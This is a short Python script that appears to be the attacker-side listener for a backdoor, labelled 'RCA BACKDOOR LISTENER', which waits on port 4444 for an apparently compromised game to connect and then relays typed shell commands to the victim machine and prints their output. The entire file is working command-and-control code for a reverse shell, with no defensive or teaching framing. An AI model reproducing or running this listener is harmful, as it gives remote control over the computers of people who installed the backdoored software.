import socket

def start_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 4444))
    s.listen(1)
    print("[*] RCA BACKDOOR LISTENER ACTIVE")
    print("[*] Waiting for game to connect...")
    
    conn, addr = s.accept()
    print(f"[!] Target connected from: {addr}")
    
    while True:
        cmd = input("Shell@RCA:~$ ")
        if not cmd.strip(): continue
        
        conn.send(cmd.encode())
        
        if cmd.lower() == "exit":
            break
            
        result = conn.recv(8192).decode()
        print(f"\n{result}\n")

if __name__ == "__main__":
    start_listener()